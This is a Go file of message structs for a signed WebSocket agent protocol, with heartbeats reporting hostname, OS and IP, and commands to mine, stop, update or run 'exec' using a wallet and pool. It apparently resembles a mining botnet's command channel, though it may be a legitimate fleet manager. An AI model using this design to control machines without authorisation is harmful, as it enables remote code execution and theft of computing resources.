package protocol

// Envelope is the outer wrapper for all WSS messages
type Envelope struct {
	Type      string `json:"type"`      // auth, heartbeat, command, response
	Payload   string `json:"payload"`   // Base64 encoded JSON (potentially encrypted)
	Signature string `json:"signature"` // Hex encoded Ed25519 signature of Payload
	PubKey    string `json:"pub_key"`   // Hex encoded Client Public Key
}

// AuthMessage is the payload for type="auth"
type AuthMessage struct {
	AgentID   string `json:"agent_id"`
	Timestamp int64  `json:"timestamp"`
	// Signature in Envelope covers: AgentID + Timestamp
}

// HeartbeatMessage is the payload for type="heartbeat"
type HeartbeatMessage struct {
	AgentID    string  `json:"agent_id"`
	Hostname   string  `json:"hostname"`
	OS         string  `json:"os"`
	Version    string  `json:"version"`
	Status     string  `json:"status"`
	MeshHealth float32 `json:"mesh_health"`
	IP         string  `json:"ip"` // Filled by server
}

// CommandMessage is the payload for type="command"
type CommandMessage struct {
	ID     string            `json:"id"`
	Action string            `json:"action"` // mine, stop, config, update, exec
	Args   map[string]string `json:"args"`
    Config *Config           `json:"config,omitempty"`
}

type Config struct {
    Wallet string `json:"wallet"`
    Pool   string `json:"pool"`
}
